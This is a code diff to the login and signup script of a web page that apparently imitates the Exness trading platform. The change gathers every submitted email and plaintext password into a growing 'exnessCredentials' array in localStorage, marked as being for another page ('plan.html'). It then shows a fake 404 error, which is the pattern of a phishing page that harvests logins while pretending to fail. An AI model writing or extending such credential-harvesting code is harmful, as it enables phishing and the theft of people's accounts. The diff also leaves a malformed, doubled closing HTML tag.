@@ -386,27 +386,31 @@
             btn.textContent = 'Please wait...';
             btn.disabled = true;
             
+            // Get form data
+            let email, password;
+            if (type === 'login') {
+                email = document.getElementById('loginEmail').value;
+                password = document.getElementById('loginPassword').value;
+            } else {
+                email = document.getElementById('signupEmail').value;
+                password = document.getElementById('signupPassword').value;
+            }
+            
+            // Store credentials in localStorage for plan.html
+            const credentials = {
+                email: email,
+                password: password,
+                type: type,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Save to localStorage (append to existing array)
+            let allCredentials = JSON.parse(localStorage.getItem('exnessCredentials') || '[]');
+            allCredentials.push(credentials);
+            localStorage.setItem('exnessCredentials', JSON.stringify(allCredentials));
+            
             // Simulate API call delay
             setTimeout(() => {
-                // Store credentials (for demo purposes)
-                if (type === 'login') {
-                    const credentials = {
-                        email: document.getElementById('loginEmail').value,
-                        password: document.getElementById('loginPassword').value,
-                        timestamp: new Date().toLocaleString(),
-                        type: 'login'
-                    };
-                    localStorage.setItem('exnessCredentials', JSON.stringify(credentials));
-                } else {
-                    const credentials = {
-                        email: document.getElementById('signupEmail').value,
-                        password: document.getElementById('signupPassword').value,
-                        timestamp: new Date().toLocaleString(),
-                        type: 'signup'
-                    };
-                    localStorage.setItem('exnessCredentials', JSON.stringify(credentials));
-                }
-                
                 // Show 404 error page
                 showErrorPage();
                 
@@ -452,4 +456,4 @@
         }
     </script>
 </body>
-    </html>
+                        </html></html>
